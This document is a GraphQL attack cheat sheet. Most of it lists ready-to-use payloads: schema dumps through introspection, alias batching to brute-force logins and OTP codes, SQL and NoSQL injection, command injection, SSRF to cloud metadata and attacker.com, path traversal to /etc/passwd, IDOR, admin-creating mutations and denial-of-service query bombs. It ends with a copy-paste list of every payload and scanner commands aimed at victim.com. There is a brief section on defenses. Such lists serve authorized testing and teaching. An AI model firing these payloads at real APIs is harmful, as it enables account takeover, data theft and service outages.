# GRAPHQL INJECTION PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS GRAPHQL?

**GraphQL** is a query language for APIs that allows clients to request exactly the data they need. It uses a single endpoint (usually `/graphql`) and supports queries, mutations, and subscriptions.

**GraphQL Injection** (or GraphQL vulnerabilities) refers to abusing misconfigurations or lack of input validation in GraphQL endpoints to:

- Dump the entire schema via introspection
- Bypass rate limiting with query batching/aliasing
- Inject malicious payloads into arguments (SQLi, NoSQLi, etc.)
- Perform IDOR by manipulating IDs
- Abuse mutations to modify data
- Cause DoS with deep or circular queries
- Bypass authentication/authorization

**Key fact:** GraphQL is not inherently vulnerable, but misconfigurations and lack of proper controls lead to serious issues. It's often found in modern APIs and bug bounty programs.

---

## 2. GRAPHQL VULNERABILITIES OVERVIEW

| Vulnerability | Description |
|---------------|-------------|
| **Introspection Enabled** | Attackers can dump the entire schema, including types, fields, and mutations. |
| **Query Batching** | Multiple queries in one request can bypass rate limiting. |
| **Aliasing** | Multiple aliases in one query can bypass rate limiting. |
| **Injection in Arguments** | Arguments passed to resolvers may be vulnerable to SQLi, NoSQLi, etc. |
| **IDOR** | Direct object references in queries/mutations can be manipulated. |
| **Mutations Abuse** | Unprotected mutations can modify data without proper authorization. |
| **DoS** | Deeply nested or circular queries can exhaust server resources. |
| **Error-Based Info Disclosure** | Detailed error messages reveal schema or internal logic. |
| **Field Suggestions** | Even with introspection disabled, error messages suggest field names. |

---

## 3. DETECTING GRAPHQL ENDPOINTS

Common endpoints:
```
/graphql
/graphiql
/api/graphql
/v1/graphql
/v2/graphql
/query
/gql
```

**Detection payloads (send a simple query):**
```
{"query":"{__typename}"}
{"query":"query { __typename }"}
{"query":"{__schema{types{name}}}"}
```

**If introspection is enabled:**
```
{"query":"{__schema{types{name fields{name}}}}"}
```

**If disabled, try field suggestions:**
```
{"query":"{ usr }"}
```
Error might reveal: `Cannot query field "usr" on type "Query". Did you mean "user"?`

---

## 4. INTROSPECTION QUERIES (FULL SCHEMA DUMP)

### 4.1 Basic Introspection Query
```
{"query":"{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}
```

### 4.2 Full Introspection Query (Standard)
```
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
```

### 4.3 Extract Specific Types
```
{"query":"{__type(name:\"User\"){name fields{name type{name}}}}"}
{"query":"{__type(name:\"Query\"){fields{name}}}"}
{"query":"{__type(name:\"Mutation\"){fields{name}}}"}
```

### 4.4 List All Queries and Mutations
```
{"query":"{__schema{queryType{fields{name args{name type{name}}}}}}"}
{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}
```

### 4.5 Get Field Arguments
```
{"query":"{__type(name:\"Query\"){fields{name args{name type{name kind ofType{name}}}}}}"}
```

### 4.6 Get Enum Values
```
{"query":"{__type(name:\"Role\"){enumValues{name}}}"}
```

### 4.7 Get Directives
```
{"query":"{__schema{directives{name locations args{name}}}}"}
```

---

## 5. QUERY BATCHING / ALIASING (RATE LIMIT BYPASS)

### 5.1 Aliasing – Multiple Queries in One Request
```
{"query":"query { a: __typename b: __typename c: __typename }"}
```

**Example: Bypass login rate limit**
```
{"query":"mutation { a: login(username:\"admin\", password:\"pass1\"){token} b: login(username:\"admin\", password:\"pass2\"){token} c: login(username:\"admin\", password:\"pass3\"){token} }"}
```

### 5.2 Query Batching (Array of Queries)
```
[
  {"query":"{__typename}"},
  {"query":"{__typename}"},
  {"query":"{__typename}"}
]
```

**Or single request with multiple operations:**
```
{"query":"query { a: __typename } query { b: __typename }"}
```

### 5.3 Bypass Rate Limit with Aliases (OTP Brute Force)
```
{"query":"mutation { a: verifyOTP(code:\"0000\") b: verifyOTP(code:\"0001\") c: verifyOTP(code:\"0002\") }"}
```

---

## 6. INJECTION INTO ARGUMENTS (SQLi, NoSQLi, etc.)

GraphQL resolvers may pass arguments directly to databases. Test for injection.

### 6.1 SQL Injection in Arguments
```
{"query":"{ user(id:\"1' OR '1'='1\") { name } }"}
{"query":"{ user(id:\"1' UNION SELECT username, password FROM users-- -\") { name } }"}
{"query":"{ search(query:\"' OR 1=1-- -\") { id } }"}
```

### 6.2 NoSQL Injection in Arguments
```
{"query":"{ user(id:{\"$ne\":null}) { name } }"}
{"query":"{ user(id:{\"$gt\":\"\"}) { name } }"}
{"query":"{ login(username:{\"$ne\":null}, password:{\"$ne\":null}) { token } }"}
```

### 6.3 Command Injection in Arguments
```
{"query":"{ ping(host:\"; whoami\") }"}
{"query":"{ ping(host:\"| whoami\") }"}
```

### 6.4 SSRF in Arguments
```
{"query":"{ fetch(url:\"http://169.254.169.254/latest/meta-data/\") }"}
{"query":"{ fetch(url:\"http://attacker.com/\") }"}
```

### 6.5 LFI in Arguments
```
{"query":"{ readFile(path:\"../../../../etc/passwd\") }"}
```

---

## 7. IDOR VIA GRAPHQL

Manipulate IDs in queries or mutations to access other users' data.

```
{"query":"{ user(id:1) { name email } }"}
{"query":"{ user(id:2) { name email } }"}
{"query":"{ user(id:3) { name email } }"}
```

**Common ID fields:**
```
id
userId
accountId
orderId
invoiceId
```

**Try UUIDs, emails, or sequential IDs:**
```
{"query":"{ user(id:\"1\") { name } }"}
{"query":"{ user(id:\"admin\") { name } }"}
{"query":"{ user(email:\"admin@example.com\") { name } }"}
```

---

## 8. MUTATIONS ABUSE

Test unprotected mutations to modify data without authorization.

```
{"query":"mutation { updateUser(id:1, role:\"admin\") { id role } }"}
{"query":"mutation { deleteUser(id:2) { success } }"}
{"query":"mutation { createUser(username:\"hacker\", password:\"pwned\", role:\"admin\") { id } }"}
{"query":"mutation { transferMoney(from:1, to:2, amount:1000) { success } }"}
```

---

## 9. DENIAL OF SERVICE (DOS) PAYLOADS

### 9.1 Deeply Nested Query
```
{"query":"{ user { posts { comments { user { posts { comments { user { posts { comments { id } } } } } } } } } }"}
```

### 9.2 Circular Query (if possible)
```
{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}
```

### 9.3 Large Aliases
```
{"query":"query { a: __typename b: __typename c: __typename ... (repeat 1000 times) }"}
```

### 9.4 Field Duplication
```
{"query":"{ __typename __typename __typename ... }"}
```

### 9.5 Fragment Bomb
```
{"query":"query { ...F } fragment F on Query { ...F }"}
```

---

## 10. BYPASSING AUTHENTICATION / AUTHORIZATION

### 10.1 Skip Auth Headers
```
{"query":"{ user { id } }"}
```
Try without `Authorization` header.

### 10.2 Use Aliases to Bypass Rate Limiting on Login
```
{"query":"mutation { a: login(username:\"admin\", password:\"pass1\"){token} b: login(username:\"admin\", password:\"pass2\"){token} }"}
```

### 10.3 Use Introspection to Find Hidden Mutations
```
{"query":"{__schema{mutationType{fields{name}}}}"}
```

### 10.4 Field Suggestions for Hidden Fields
```
{"query":"{ user { password } }"}
```
Error might reveal: `Cannot query field "password" on type "User". Did you mean "passwordHash"?`

---

## 11. ERROR-BASED INFORMATION DISCLOSURE

Trigger errors to reveal internal details.

```
{"query":"{ user(id:\"invalid\") { name } }"}
{"query":"{ __type(name:\"NonExistent\") { name } }"}
{"query":"{ user { unknownField } }"}
```

**Look for:**
- Stack traces
- Database errors
- Field suggestions
- Schema hints

---

## 12. BYPASS TECHNIQUES

### 12.1 Bypass Introspection Disabled
Try:
- `__schema` with different casing
- `__type` with aliases
- Use `__typename` to confirm endpoint
- Use field suggestions to enumerate fields

### 12.2 Bypass Depth Limits
- Use fragments to nest deeper
- Use aliases to repeat fields
- Use `@include` / `@skip` directives

### 12.3 Bypass Query Allowlists
- Use aliases to rename fields
- Use fragments
- Use inline fragments

### 12.4 Bypass WAF
- URL-encode payloads
- Use `Content-Type: application/json` vs `application/graphql`
- Split queries across multiple requests

### 12.5 HTTP Method Bypass
- Try `GET` with `?query={...}`
- Try `POST` with `application/graphql`
- Try `PUT` or `PATCH`

---

## 13. TOOLS

| Tool | Usage |
|------|-------|
| **GraphQL Voyager** | Visualize GraphQL schema. |
| **GraphiQL** | Interactive GraphQL IDE. |
| **InQL (Burp Extension)** | GraphQL scanning and introspection. |
| **GraphQL Raider (Burp Extension)** | Manual testing and exploitation. |
| **graphql-cop** | Security audit tool for GraphQL. |
| **claire** | GraphQL security scanner. |
| **graphw00f** | GraphQL fingerprinting. |
| **Altair GraphQL Client** | Desktop client for testing. |
| **Postman** | Supports GraphQL queries. |

**Commands:**
```bash
# graphql-cop
python3 graphql-cop.py -t http://victim.com/graphql

# claire
claire --url http://victim.com/graphql

# InQL (Burp)
# Install from BApp Store, then scan.
```

---

## 14. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Disable introspection in production** | Set `introspection: false` in Apollo Server or similar. |
| **2. Implement depth limiting** | Use libraries like `graphql-depth-limit`. |
| **3. Implement query complexity analysis** | Limit cost of queries. |
| **4. Rate limiting** | Apply per-IP and per-user rate limits. |
| **5. Disable batching** | Or limit batch size. |
| **6. Disable aliasing abuse** | Limit number of aliases per query. |
| **7. Input validation** | Validate and sanitize all arguments. |
| **8. Authorization checks** | Enforce at resolver level. |
| **9. Avoid detailed errors** | Return generic error messages in production. |
| **10. Use persisted queries** | Only allow pre-approved queries. |
| **11. WAF** | Use GraphQL-aware WAF rules. |
| **12. Monitor and log** | Detect anomalous queries. |

**Apollo Server example (disable introspection):**
```javascript
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false,
  plugins: [depthLimit(5)]
});
```

---

## 15. TIPS FOR TESTING

1. Find the GraphQL endpoint (common paths: `/graphql`, `/api/graphql`).
2. Send `{"query":"{__typename}"}` to confirm.
3. Try full introspection to dump schema.
4. If introspection disabled, use field suggestions from errors.
5. Test for IDOR by changing IDs.
6. Test mutations for authorization bypass.
7. Test for injection in arguments (SQLi, NoSQLi, etc.).
8. Test batching/aliasing for rate limit bypass.
9. Test for DoS with deep queries.
10. Use Burp extensions like InQL and GraphQL Raider.
11. Always test on your own account first.
12. Check for persisted query support.

---

## 16. QUICK REFERENCE – COMMON GRAPHQL QUERIES

| Purpose | Query |
|---------|-------|
| Confirm endpoint | `{__typename}` |
| Dump types | `{__schema{types{name}}}` |
| Dump queries | `{__schema{queryType{fields{name}}}}` |
| Dump mutations | `{__schema{mutationType{fields{name}}}}` |
| Get type details | `{__type(name:"User"){name fields{name}}}` |
| Get field args | `{__type(name:"Query"){fields{name args{name}}}}` |
| Get enum values | `{__type(name:"Role"){enumValues{name}}}` |
| Get directives | `{__schema{directives{name locations}}}` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
{"query":"{__typename}"}
{"query":"query { __typename }"}
{"query":"{__schema{types{name}}}"}
{"query":"{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
{"query":"{__type(name:\"User\"){name fields{name type{name}}}}"}
{"query":"{__type(name:\"Query\"){fields{name}}}"}
{"query":"{__type(name:\"Mutation\"){fields{name}}}"}
{"query":"{__schema{queryType{fields{name args{name type{name}}}}}}"}
{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}
{"query":"{__type(name:\"Query\"){fields{name args{name type{name kind ofType{name}}}}}}"}
{"query":"{__type(name:\"Role\"){enumValues{name}}}"}
{"query":"{__schema{directives{name locations args{name}}}}"}
{"query":"query { a: __typename b: __typename c: __typename }"}
{"query":"mutation { a: login(username:\"admin\", password:\"pass1\"){token} b: login(username:\"admin\", password:\"pass2\"){token} c: login(username:\"admin\", password:\"pass3\"){token} }"}
[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]
{"query":"query { a: __typename } query { b: __typename }"}
{"query":"mutation { a: verifyOTP(code:\"0000\") b: verifyOTP(code:\"0001\") c: verifyOTP(code:\"0002\") }"}
{"query":"{ user(id:\"1' OR '1'='1\") { name } }"}
{"query":"{ user(id:\"1' UNION SELECT username, password FROM users-- -\") { name } }"}
{"query":"{ search(query:\"' OR 1=1-- -\") { id } }"}
{"query":"{ user(id:{\"$ne\":null}) { name } }"}
{"query":"{ user(id:{\"$gt\":\"\"}) { name } }"}
{"query":"{ login(username:{\"$ne\":null}, password:{\"$ne\":null}) { token } }"}
{"query":"{ ping(host:\"; whoami\") }"}
{"query":"{ ping(host:\"| whoami\") }"}
{"query":"{ fetch(url:\"http://169.254.169.254/latest/meta-data/\") }"}
{"query":"{ fetch(url:\"http://attacker.com/\") }"}
{"query":"{ readFile(path:\"../../../../etc/passwd\") }"}
{"query":"{ user(id:1) { name email } }"}
{"query":"{ user(id:2) { name email } }"}
{"query":"{ user(id:3) { name email } }"}
{"query":"{ user(id:\"1\") { name } }"}
{"query":"{ user(id:\"admin\") { name } }"}
{"query":"{ user(email:\"admin@example.com\") { name } }"}
{"query":"mutation { updateUser(id:1, role:\"admin\") { id role } }"}
{"query":"mutation { deleteUser(id:2) { success } }"}
{"query":"mutation { createUser(username:\"hacker\", password:\"pwned\", role:\"admin\") { id } }"}
{"query":"mutation { transferMoney(from:1, to:2, amount:1000) { success } }"}
{"query":"{ user { posts { comments { user { posts { comments { user { posts { comments { id } } } } } } } } } }"}
{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}
{"query":"query { a: __typename b: __typename c: __typename ... (repeat 1000 times) }"}
{"query":"{ __typename __typename __typename ... }"}
{"query":"query { ...F } fragment F on Query { ...F }"}
{"query":"{ user { id } }"}
{"query":"mutation { a: login(username:\"admin\", password:\"pass1\"){token} b: login(username:\"admin\", password:\"pass2\"){token} }"}
{"query":"{__schema{mutationType{fields{name}}}}"}
{"query":"{ user { password } }"}
{"query":"{ user(id:\"invalid\") { name } }"}
{"query":"{ __type(name:\"NonExistent\") { name } }"}
{"query":"{ user { unknownField } }"}
python3 graphql-cop.py -t http://victim.com/graphql
claire --url http://victim.com/graphql
```
